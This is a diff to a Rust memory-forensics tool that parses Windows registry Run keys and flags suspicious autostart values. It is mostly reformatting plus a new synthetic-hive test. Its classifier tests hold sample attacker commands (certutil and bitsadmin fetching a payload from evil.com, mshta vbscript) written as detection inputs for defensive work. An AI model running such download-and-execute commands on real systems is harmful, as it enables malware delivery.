@@ -180,14 +180,11 @@ pub fn walk_run_keys<P: PhysicalMemoryProvider>(
                 Some(c) => c,
                 None => continue,
             };
-            let values = match crate::registry_keys::read_registry_values(
-                reader,
-                ntuser_hive_addr,
-                cell,
-            ) {
-                Ok(v) => v,
-                Err(_) => continue,
-            };
+            let values =
+                match crate::registry_keys::read_registry_values(reader, ntuser_hive_addr, cell) {
+                    Ok(v) => v,
+                    Err(_) => continue,
+                };
             for val in values {
                 if entries.len() >= MAX_ENTRIES {
                     break;
@@ -227,11 +224,16 @@ const NK_NAME_DATA: usize = 0x4C;
 
 /// Compute the virtual address of a cell from its cell index.
 fn cell_vaddr(hive_addr: u64, cell_index: u32) -> u64 {
-    hive_addr.wrapping_add(HBIN_START).wrapping_add(cell_index as u64)
+    hive_addr
+        .wrapping_add(HBIN_START)
+        .wrapping_add(cell_index as u64)
 }
 
 /// Read raw cell data (skipping the 4-byte size header) from a cell vaddr.
-fn read_cell<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, cell_vaddr: u64) -> Option<Vec<u8>> {
+fn read_cell<P: PhysicalMemoryProvider>(
+    reader: &ObjectReader<P>,
+    cell_vaddr: u64,
+) -> Option<Vec<u8>> {
     // Size field (i32); skip it, read up to 4096 bytes of cell payload.
     reader.read_bytes(cell_vaddr + 4, 4096).ok()
 }
@@ -241,7 +243,11 @@ fn key_node_name(data: &[u8]) -> String {
     if data.len() < NK_NAME_DATA {
         return String::new();
     }
-    let len = u16::from_le_bytes(data[NK_NAME_LEN..NK_NAME_LEN + 2].try_into().unwrap_or([0; 2])) as usize;
+    let len = u16::from_le_bytes(
+        data[NK_NAME_LEN..NK_NAME_LEN + 2]
+            .try_into()
+            .unwrap_or([0; 2]),
+    ) as usize;
     let end = NK_NAME_DATA + len.min(data.len().saturating_sub(NK_NAME_DATA));
     String::from_utf8_lossy(&data[NK_NAME_DATA..end]).into_owned()
 }
@@ -267,16 +273,15 @@ fn find_key_cell<P: PhysicalMemoryProvider>(
             return None;
         }
 
-        let subkey_count = u32::from_le_bytes(
-            data[NK_STABLE_COUNT..NK_STABLE_COUNT + 4].try_into().ok()?,
-        ) as usize;
+        let subkey_count =
+            u32::from_le_bytes(data[NK_STABLE_COUNT..NK_STABLE_COUNT + 4].try_into().ok()?)
+                as usize;
         if subkey_count == 0 {
             return None;
         }
 
-        let list_cell = u32::from_le_bytes(
-            data[NK_STABLE_LIST..NK_STABLE_LIST + 4].try_into().ok()?,
-        );
+        let list_cell =
+            u32::from_le_bytes(data[NK_STABLE_LIST..NK_STABLE_LIST + 4].try_into().ok()?);
         let list_data = read_cell(reader, cell_vaddr(hive_addr, list_cell))?;
         if list_data.len() < 4 {
             return None;
@@ -287,7 +292,7 @@ fn find_key_cell<P: PhysicalMemoryProvider>(
 
         let (entry_size, offset_base) = match list_sig {
             0x666C | 0x686C => (8usize, 4usize), // lf/lh: 4-byte cell + 4-byte hash
-            0x696C => (4usize, 4usize),            // li: 4-byte cell only
+            0x696C => (4usize, 4usize),          // li: 4-byte cell only
             _ => return None,
         };
 
@@ -313,7 +318,101 @@ fn find_key_cell<P: PhysicalMemoryProvider>(
 
 #[cfg(test)]
 mod tests {
+    #![allow(clippy::items_after_statements)]
     use super::*;
+    use crate::test_hive::CellHive;
+
+    /// Build an allocated cell: i32 size header (negative) + data, 8-aligned.
+    fn build_cell(data: &[u8]) -> Vec<u8> {
+        let total = ((4 + data.len() + 7) & !7) as i32;
+        let mut cell = Vec::with_capacity(total as usize);
+        cell.extend_from_slice(&(-total).to_le_bytes());
+        cell.extend_from_slice(data);
+        cell.resize(total as usize, 0);
+        cell
+    }
+
+    /// Build an nk cell-data buffer (stable count@0x14, list@0x1c,
+    /// NameLength@0x48, Name@0x4c).
+    fn nk_data(name: &[u8], stable_count: u32, stable_list: u32) -> Vec<u8> {
+        let mut d = vec![0u8; NK_NAME_DATA + name.len()];
+        d[0..2].copy_from_slice(&NK_SIG.to_le_bytes());
+        d[NK_STABLE_COUNT..NK_STABLE_COUNT + 4].copy_from_slice(&stable_count.to_le_bytes());
+        d[NK_STABLE_LIST..NK_STABLE_LIST + 4].copy_from_slice(&stable_list.to_le_bytes());
+        d[NK_NAME_LEN..NK_NAME_LEN + 2].copy_from_slice(&(name.len() as u16).to_le_bytes());
+        d[NK_NAME_DATA..NK_NAME_DATA + name.len()].copy_from_slice(name);
+        d
+    }
+
+    /// Build an lf list cell-data buffer (8-byte entries: cell index + hash).
+    fn lf_data(children: &[u32]) -> Vec<u8> {
+        let mut d = vec![0u8; 4 + children.len() * 8];
+        d[0..2].copy_from_slice(&0x666Cu16.to_le_bytes());
+        d[2..4].copy_from_slice(&(children.len() as u16).to_le_bytes());
+        for (i, &c) in children.iter().enumerate() {
+            d[4 + i * 8..4 + i * 8 + 4].copy_from_slice(&c.to_le_bytes());
+        }
+        d
+    }
+
+    /// SOFTWARE-style hive reached via HMAP cell translation (root nk at the
+    /// regf default 0x20), carrying `Microsoft\Windows\CurrentVersion\Run` with
+    /// one Run value. The flat `hive + 0x1000 + idx` navigation cannot resolve
+    /// the HMAP-scattered cells, so this fails until `find_key_cell` migrates.
+    #[test]
+    fn walk_run_keys_software_run_via_cell_map() {
+        let hive_vaddr: u64 = 0xFFFF_8000_0120_0000;
+        let mut bin = vec![0u8; 0x1000];
+        let place = |bin: &mut [u8], off: usize, cell: &[u8]| {
+            bin[off..off + cell.len()].copy_from_slice(cell);
+        };
+        // root(0x20) → lf(0x80) → Microsoft(0x100)
+        place(&mut bin, 0x20, &build_cell(&nk_data(b"", 1, 0x80)));
+        place(&mut bin, 0x80, &build_cell(&lf_data(&[0x100])));
+        // Microsoft(0x100) → lf(0x140) → Windows(0x180)
+        place(
+            &mut bin,
+            0x100,
+            &build_cell(&nk_data(b"Microsoft", 1, 0x140)),
+        );
+        place(&mut bin, 0x140, &build_cell(&lf_data(&[0x180])));
+        // Windows(0x180) → lf(0x1c0) → CurrentVersion(0x200)
+        place(&mut bin, 0x180, &build_cell(&nk_data(b"Windows", 1, 0x1c0)));
+        place(&mut bin, 0x1c0, &build_cell(&lf_data(&[0x200])));
+        // CurrentVersion(0x200) → lf(0x240) → Run(0x280)
+        place(
+            &mut bin,
+            0x200,
+            &build_cell(&nk_data(b"CurrentVersion", 1, 0x240)),
+        );
+        place(&mut bin, 0x240, &build_cell(&lf_data(&[0x280])));
+        // Run(0x280): no subkeys, 1 value-list@0x300.
+        let mut run = nk_data(b"Run", 0, 0);
+        run[0x24..0x28].copy_from_slice(&1u32.to_le_bytes()); // ValueCount
+        run[0x28..0x2c].copy_from_slice(&0x300u32.to_le_bytes()); // ValueList
+        place(&mut bin, 0x280, &build_cell(&run));
+        // value-list(0x300) → vk(0x340)
+        place(&mut bin, 0x300, &build_cell(&0x340u32.to_le_bytes()));
+        // vk(0x340): "Updater" = REG_SZ inline UTF-16LE 'X' (2 inline bytes).
+        let mut vk = vec![0u8; 0x14 + 7];
+        vk[0..2].copy_from_slice(&0x6B76u16.to_le_bytes());
+        vk[0x02..0x04].copy_from_slice(&7u16.to_le_bytes()); // NameLength "Updater"
+        vk[0x04..0x08].copy_from_slice(&0x8000_0002u32.to_le_bytes()); // inline, 2 bytes
+        vk[0x08..0x0c].copy_from_slice(&0x0000_0058u32.to_le_bytes()); // 'X' UTF-16LE
+        vk[0x0c..0x10].copy_from_slice(&1u32.to_le_bytes()); // REG_SZ
+        vk[0x14..0x1b].copy_from_slice(b"Updater");
+        place(&mut bin, 0x340, &build_cell(&vk));
+
+        let reader = CellHive::with_bin(hive_vaddr, bin).reader();
+        let entries = walk_run_keys(&reader, hive_vaddr, 0).unwrap();
+        let entry = entries
+            .iter()
+            .find(|e| e.value_name == "Updater")
+            .expect("Run value found via HMAP");
+        assert_eq!(entry.hive, "SOFTWARE");
+        assert_eq!(entry.key_path, "Microsoft\\Windows\\CurrentVersion\\Run");
+        assert_eq!(entry.value_data, "X");
+    }
 
     // ── classify_run_key tests ───────────────────────────────────────
 
@@ -329,7 +428,10 @@ mod tests {
     /// Benign: empty string is not suspicious.
     #[test]
     fn classify_empty_not_suspicious() {
-        assert!(!classify_run_key(""), "empty value should not be suspicious");
+        assert!(
+            !classify_run_key(""),
+            "empty value should not be suspicious"
+        );
     }
 
     /// Suspicious: PowerShell with encoded command.
@@ -354,7 +456,7 @@ mod tests {
     #[test]
     fn classify_mshta() {
         assert!(
-            classify_run_key("mshta vbscript:Execute(\"CreateObject(...)\")")  ,
+            classify_run_key("mshta vbscript:Execute(\"CreateObject(...)\")"),
             "mshta should be suspicious"
         );
     }
@@ -372,7 +474,9 @@ mod tests {
     #[test]
     fn classify_certutil_urlcache() {
         assert!(
-            classify_run_key("certutil -urlcache -split -f http://evil.com/payload.exe C:\\payload.exe"),
+            classify_run_key(
+                "certutil -urlcache -split -f http://evil.com/payload.exe C:\\payload.exe"
+            ),
             "certutil -urlcache should be suspicious"
         );
     }
@@ -381,7 +485,9 @@ mod tests {
     #[test]
     fn classify_bitsadmin() {
         assert!(
-            classify_run_key("bitsadmin /transfer myJob http://evil.com/payload.exe C:\\payload.exe"),
+            classify_run_key(
+                "bitsadmin /transfer myJob http://evil.com/payload.exe C:\\payload.exe"
+            ),
             "bitsadmin should be suspicious"
         );
     }
@@ -417,7 +523,9 @@ mod tests {
     #[test]
     fn classify_rundll32_system32_benign() {
         assert!(
-            !classify_run_key(r"C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"),
+            !classify_run_key(
+                r"C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"
+            ),
             "rundll32 with system32 DLL should not be suspicious"
         );
     }
@@ -476,6 +584,9 @@ mod tests {
         // Non-zero NTUSER addr that points nowhere readable → empty but no panic.
         let result = walk_run_keys(&reader, 0, 0xDEAD_0000);
         // Should not panic; either empty Ok or tolerable error.
-        assert!(result.is_ok(), "walker should degrade gracefully with unreachable hive");
+        assert!(
+            result.is_ok(),
+            "walker should degrade gracefully with unreachable hive"
+        );
     }
 }
